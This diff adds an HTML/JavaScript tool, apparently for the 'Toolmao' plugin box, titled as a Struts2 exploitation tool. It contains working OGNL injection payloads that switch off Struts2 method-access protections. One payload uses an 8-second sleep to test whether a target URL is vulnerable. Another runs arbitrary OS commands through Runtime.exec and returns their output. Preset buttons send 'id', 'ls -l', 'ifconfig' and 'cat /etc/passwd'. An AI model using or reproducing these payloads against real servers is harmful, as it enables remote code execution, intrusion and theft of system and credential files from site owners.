@@ -1,0 +1,129 @@
+<html>
+	<head>
+		<title>工具猫魔盒新程序</title>
+		<meta http-equiv="Content-Type" content="text/html;charset=gb2312" />
+		<script type="text/javascript" src="..\..\lib\gnbox.js" charset="gb2312"></script>
+		<script type="text/javascript">
+			/*魔盒常规设置*/
+
+			Win.caption("Struts2 漏洞利用工具 by gainover@乌云"); 	//魔盒标题栏设置
+			Win.resizeTo(600,340);			//魔盒大小设置
+			Win.show();						//显示魔盒主界面
+			Win.center();					//居中显示魔盒
+			Win.author("gainover","gainover@qq.com",1);	//作者信息
+		</script>
+		<script type="text/javascript">
+			/*使用extlib目录下的js脚本 (use javascript in extlib)*/
+			//use("md5"); //例如 (for example)
+			/**{libtag}**/
+		</script>
+		<style type="text/css">
+			body{
+				border:none;    	/*内部边框不显示*/
+				overflow:hidden;	/*滚动条不显示*/
+				font-size:12px; 	/*默认文字大小*/
+				background:#f1f1f1; /*默认背景颜色*/
+			}
+		</style>
+	</head>
+	<body>
+		<script type="text/javascript">
+		var setting="('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))";
+		var checkstr=setting+"&(d)(('@java.lang.Thread@sleep(8000)')(d))";
+		var teststr="1";
+		var cmdstr=setting+"&(g)(('\\43mycmd\\75\\'{%cmd%}\\'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))";
+		function test (delay,normaltime){
+			var url=$T($("url").value);
+			var meth=$("m").value;
+			if(url){
+				if(url.substring(0,7)!="http://"&&url.substring(0,8)!="https://"){
+					url="http://"+url;
+				}
+				log("开始检测...");
+				var time1=new Date().getTime();
+				var data={};
+				if(delay){
+					if(meth=="GET"){
+						if(/action$/.test(url)||url.indexOf("?")==-1){
+							//如果地址里没问号
+							url+="?";
+						}else{
+							url+="&";
+						}
+						url+=checkstr;
+					}else{
+						data={"_toolmao_stream":checkstr};
+					}
+				}else{
+					data={"_toolmao_stream":"x".repeat(checkstr.length)};
+				}
+				var callback=function (){
+					var normaldelay=(new Date().getTime()-time1);
+					if(!delay){
+						log("正常连接耗时:"+normaldelay+"毫秒");
+						//接着测试sleep检测
+						test(true,normaldelay);
+					}else{
+						log("缺陷测试耗时:"+normaldelay+"毫秒");
+						var dis=normaldelay-normaltime;
+						log("测试差距时间:"+dis+"毫秒");
+						if(Math.floor(dis/1000)>5){
+							log("该服务器存在漏洞,你可以点击下方按钮继续进行操作");
+						}else{
+							log("该服务器不存在漏洞");
+						}
+					}
+				}
+				if(meth=="GET"){
+					Net.get(url,callback,"text","","","",callback);
+				}else{
+					Net.post(url,data,callback,"text","","","",callback);
+				}
+			}else{
+				alert("请输入需要检测的网址");
+			}
+		}
+		function log (str){
+			$("res").value+=str+"\n";
+			$("res").scrollTop=$("res").scrollHeight;
+		}
+		function sendCmd (data){
+			if(data){
+				$("cmd").value=data;
+			}
+			var url=$T($("url").value);
+			var cmd=data||$T($("cmd").value);
+			cmd=cmd.replace(/\//g,"\\u002f")
+				   .replace(/#/g,"\\u0023")
+				   .replace(/=/g,"\\u003d")
+				   .replace(/-/g,"\\u002d")
+				   .replace(/&/g,"\\u0026")
+				   .replace(/ /g,"\\40")
+				   .replace(/'/g,"\\'");
+			if(cmd){
+				var data=cmdstr.replace(/\{%cmd%\}/g,cmd);
+				var callback=function(rs){
+					$("res").value=rs;
+				};
+				Net.post(url,{
+					_toolmao_stream:data
+				},callback,"text","","","",function(){
+					$("res").value="请求出错";
+				});
+			}else{
+				alert("不是吧!空的命令你也发...");
+			}
+		}
+		</script>
+		请输入测试地址: <input type="text" value="" id="url" class="" style="width:300px;"/> <span style="display:none">方式: <select id="m"><option value="GET">GET</option><option value="POST" selected>POST</option></select></span><input type="button" value="检测是否有漏洞" onclick="test()" />
+		<br/><br/>
+		<textarea id="res" style="width:100%;height:150px"></textarea><br/><br/>
+		输入命令: <input type="text" value="" id="cmd" class="" style="width:512px;"/><br/><br/>
+		<input type="button" value="发送命令" onclick="sendCmd()" />
+		<input type="button" value="当前用户" onclick="sendCmd('id')" />
+		<input type="button" value="列当前目录" onclick="sendCmd('ls -l')" />
+		<input type="button" value="查看IP地址" onclick="sendCmd('ifconfig')" />
+		<input type="button" value="查看用户信息" onclick="sendCmd('cat /etc/passwd')" /><br/><br/>
+		友情链接 : <a href="http://www.wooyun.org">www.wooyun.org (乌云)</a> | <a href="http://www.toolmao.com">www.toolmao.com (工具猫)</a>
+	</body>
+</html>
